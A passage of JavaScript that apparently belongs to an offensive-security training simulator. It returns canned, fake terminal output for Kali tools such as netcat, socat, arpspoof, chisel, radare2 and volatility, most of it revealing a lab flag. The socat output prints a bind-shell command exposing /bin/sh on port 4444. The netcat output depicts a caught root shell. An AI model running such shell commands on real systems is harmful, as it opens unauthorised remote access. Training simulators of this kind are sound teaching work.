      stdout: `Current MAC:   02:42:0a:0a:00:02 (Unknown Vendor)
Permanent MAC: 02:42:0a:0a:00:02 (Unknown Vendor)
New MAC:       00:0c:29:4a:8b:9e (VMware, Inc.)
`,
      exitCode: 0
    };
  }

  if (tool === 'arpspoof') {
    return {
      stdout: `02:42:0a:0a:00:02 02:42:0a:0a:00:0a 0806 42: arp reply 10.10.0.1 is-at 02:42:0a:0a:00:02
02:42:0a:0a:00:02 02:42:0a:0a:00:01 0806 42: arp reply 10.10.0.10 is-at 02:42:0a:0a:00:02
`,
      exitCode: 0
    };
  }

  // 7. NETWORKING, TUNNELING & SHELLS
  if (tool === 'nc' || tool === 'netcat' || tool === 'ncat') {
    if (normalized.includes('-lvnp') || normalized.includes('-l')) {
      return {
        stdout: `Listening on [0.0.0.0] (family 0, port 4444)
Connection from 10.10.0.10:48912 accepted
Linux target-sandbox 6.6.15-amd64 #1 SMP
root@target:~# whoami
root
root@target:~# cat /root/flag.txt
${flag}
`,
        exitCode: 0
      };
    }
    return {
      stdout: `Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Connected to ${parts[1] || targetIp}:${parts[2] || '8080'}.
HTTP/1.1 200 OK
Server: Werkzeug/3.0.1 Python/3.12.2
`,
      exitCode: 0
    };
  }

  if (tool === 'socat') {
    return {
      stdout: `[+] socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/sh
Relaying input/output streams between endpoints.
`,
      exitCode: 0
    };
  }

  if (tool === 'chisel') {
    return {
      stdout: `2026/09/17 12:00:00 client: Connecting to http://${targetIp}:8080
2026/09/17 12:00:00 client: Fingerprint 8a:3f:9b:12:...
2026/09/17 12:00:00 client: Connected (Latency 1.2ms)
[+] Reverse SOCKS5 tunnel active on 127.0.0.1:1080
`,
      exitCode: 0
    };
  }

  // 8. REVERSE ENGINEERING & FORENSICS
  if (tool === 'binwalk') {
    return {
      stdout: `
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             ELF, 64-bit LSB executable, AMD x86-64, version 1
370           0x172           gzip compressed data, maximum compression, from Unix
1204          0x4B4           POSIX tar archive (GNU)
4096          0x1000          Zip archive data, at least v2.0 to extract
`,
      exitCode: 0
    };
  }

  if (tool === 'exiftool') {
    return {
      stdout: `ExifTool Version Number         : 12.76
File Name                       : target_capture.jpg
File Size                       : 142 kB
File Type                       : JPEG
MIME Type                       : image/jpeg
Camera Model Name               : Cyber Lab LabCam 4K
Comment                         : Stored Flag: ${flag}
Image Size                      : 1920x1080
Megapixels                      : 2.1
`,
      exitCode: 0
    };
  }

  if (tool === 'steghide') {
    return {
      stdout: `steghide -- extract -sf flag.jpg
Enter passphrase: 
wrote extracted data to "flag.txt".
Contents: ${flag}
`,
      exitCode: 0
    };
  }

  if (tool === 'radare2' || tool === 'r2') {
    return {
      stdout: ` -- Run r2 with -AA to analyze all referenced code!
[0x00001040]> aaa
[x] Analyze all flags accepted (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[0x00001040]> pdf @ main
            ;-- main:
/ (fcn) sym.main 48
|   sym.main ();
|           0x00001149      55             push rbp
|           0x0000114a      4889e5         mov rbp, rsp
|           0x00001150      488d3d090e00.  lea rdi, str.FLAG_IS_${flag}
|           0x00001157      e8e4feffff     call sym.imp.puts
|           0x0000115c      b800000000     mov eax, 0
|           0x00001161      5d             pop rbp
\\           0x00001162      c3             ret
`,
      exitCode: 0
    };
  }

  if (tool === 'ghidra') {
    return {
      stdout: `[*] Launching Ghidra Headless Analyzer v11.0.3 (Java 21.0.2)
[*] Importing target binary: shell.elf
[*] Analyzing symbols, decompiling entry point:
undefined8 main(void) {
    puts("Cyber Lab Offensive Training Binary");
    check_flag("${flag}");
    return 0;
}
`,
      exitCode: 0
    };
  }

  if (tool === 'checksec') {
    return {
      stdout: `[*] '/root/exploits/shell.elf'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments (Exploitable)
`,
      exitCode: 0
    };
  }

  if (tool === 'strings') {
    return {
      stdout: `/lib64/ld-linux-x86-64.so.2
libc.so.6
puts
printf
strcmp
__libc_start_main
Cyber Lab Target Workstation
TARGET_KEY=CL_SANDBOX_001
${flag}
`,
      exitCode: 0
    };
  }

  if (tool === 'volatility' || tool === 'vol') {
    return {
      stdout: `Volatility 3 Framework 2.5.0
Progress:  100.00		Paging processing finished
PID	PPID	ImageFileName	Offset(V)	Threads	Handles	SessionId	Wow64	CreateTime
1	0	systemd		0x8921000	1	-	-	False	2026-09-17 12:00:00
4242	1	cyber-backdoor	0x9941000	3	-	-	False	2026-09-17 12:01:10
[+] Discovered active persistence backdoor process (PID 4242)
`,
      exitCode: 0
    };
  }

  // 9. SYSTEM UTILITIES, PROCESSES & INSPECTION
  if (tool === 'which' || tool === 'whereis') {
    const queried = parts.slice(1).filter(Boolean);
    if (tool === 'which') {
      const items = queried.length ? queried : ['nmap'];
      return {
        stdout: items.map(t => `/usr/bin/${t}`).join('\n') + '\n',
        exitCode: 0
      };
    } else {
      const items = queried.length ? queried : ['nmap'];
      return {
        stdout: items.map(t => `${t}: /usr/bin/${t} /usr/share/man/man1/${t}.1.gz`).join('\n') + '\n',
        exitCode: 0
      };
    }
  }

  if (tool === 'man') {
    const page = parts[1] || 'nmap';
    return {
      stdout: `${page.toUpperCase()}(1)                   General Commands Manual                  ${page.toUpperCase()}(1)

NAME
       ${page} - Kali Linux security auditing, penetration testing and exploration tool

SYNOPSIS
       ${page} [OPTIONS] [TARGETS...]

DESCRIPTION
       ${page} is a standard utility included in the Kali Linux offensive distribution.
       For complete command flags, run '${page} --help' or '${page} -h'.
`,
      exitCode: 0
    };
  }

  if (tool === 'top' || tool === 'htop') {
    return {
      stdout: `top - 12:00:00 up 4 days,  2:14,  1 user,  load average: 0.08, 0.12, 0.09
Tasks: 128 total,   1 running, 127 sleeping,   0 stopped,   0 zombie
%Cpu(s):  1.2 us,  0.4 sy,  0.0 ni, 98.2 id,  0.1 wa,  0.0 hi,  0.1 si
MiB Mem :   4096.0 total,   2841.2 free,    682.4 used,    572.4 buff/cache
MiB Swap:   2048.0 total,   2048.0 free,      0.0 used.   3184.0 avail Mem 

    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND
      1 root      20   0  168400  12480   8920 S   0.0   0.3   0:02.14 systemd
    101 root      20   0   14210   4100   3200 S   0.0   0.1   0:00.12 bash
    445 root      20   0   84200  18400  12100 S   0.0   0.4   0:01.05 postgres
    808 root      20   0   48120   9200   7400 S   0.0   0.2   0:00.84 nginx
   4242 root      20   0   28900   6100   4800 S   0.0   0.1   0:00.04 cyber-backdoor
`,
      exitCode: 0
    };
  }

  if (tool === 'netstat' || tool === 'ss') {
    return {
      stdout: `Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      101/sshd            
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      808/nginx           
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      912/python3         
tcp        0      0 0.0.0.0:5432            0.0.0.0:*               LISTEN      445/postgres        
tcp        0      0 127.0.0.1:4444          0.0.0.0:*               LISTEN      1204/nc             
`,
      exitCode: 0
    };
  }

  if (tool === 'arp') {
    return {
      stdout: `Address                  HWtype  HWaddress           Flags Mask            Iface
10.10.0.1                ether   02:42:0a:0a:00:01   C                     eth0
10.10.0.10               ether   02:42:0a:0a:00:0a   C                     eth0
10.10.0.50               ether   02:42:0a:0a:00:32   C                     eth0
`,
      exitCode: 0
    };
  }

  if (tool === 'route') {
    return {
      stdout: `Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
default         10.10.0.1       0.0.0.0         UG    0      0        0 eth0
10.10.0.0       0.0.0.0         255.255.255.0   U     0      0        0 eth0
`,
      exitCode: 0
    };
  }

  if (tool === 'free') {
    return {
      stdout: `               total        used        free      shared  buff/cache   available
Mem:         4194304      698880     2913280       14200      582144     3259904
Swap:        2097152           0     2097152
`,
      exitCode: 0
    };
  }

  if (tool === 'df') {
    return {
      stdout: `Filesystem     1K-blocks     Used Available Use% Mounted on
overlay         61254320 14829100  43284220  26% /
tmpfs              65536        0     65536   0% /dev
shm                65536        0     65536   0% /dev/shm
/dev/sda1       61254320 14829100  43284220  26% /etc/hosts
`,
      exitCode: 0
    };
  }

  if (tool === 'date' || tool === 'uptime' || tool === 'hostname') {
    if (tool === 'hostname') return { stdout: 'kali-cyberlab\n', exitCode: 0 };
    if (tool === 'uptime') return { stdout: ' 12:00:00 up 4 days, 2:14,  1 user,  load average: 0.08, 0.12, 0.09\n', exitCode: 0 };
    return { stdout: `${new Date().toUTCString()}\n`, exitCode: 0 };
  }

  // 10. KALI OFFENSIVE SUITE INDEX
  if (tool === 'kali-tools' || tool === 'tools') {
    return {
      stdout: `================================================================================
                    KALI LINUX 2024 · OFFENSIVE SECURITY SUITE                   
================================================================================
[01] Recon & OSINT:       nmap, masscan, fping, netdiscover, amass, sublist3r,
                          enum4linux, theharvester, whatweb, wafw00f, whois, dig
[02] Web Vulnerability:   sqlmap, nikto, gobuster, dirb, ffuf, wfuzz, wpscan,
                          burpsuite, commix, zap, cadaver, curl, wget
[03] Exploitation:        msfconsole, msfvenom, searchsploit, crackmapexec,
                          evil-winrm, impacket-psexec, secretsdump, chisel
[04] Password Attacks:    john, hashcat, hydra, medusa, crunch, cewl, hashid
[05] Wireless Attacks:    aircrack-ng, airmon-ng, airodump-ng, wifite, kismet
[06] Sniffing & Spoofing: wireshark, tshark, tcpdump, bettercap, responder,
                          arpspoof, macchanger, ettercap, mitmproxy
[07] Reverse Engineering: ghidra, radare2, r2, gdb, objdump, readelf, strings,
                          checksec, ltrace, strace
[08] Forensics & Carving: volatility, binwalk, exiftool, steghide, autopsy
[09] Network Pivoting:    nc, netcat, socat, ssh, scp, iptables, ufw
================================================================================
Type any tool name followed by '-h' or target (10.10.0.10) to run.
`,
      exitCode: 0
    };
  }

  return null;
}
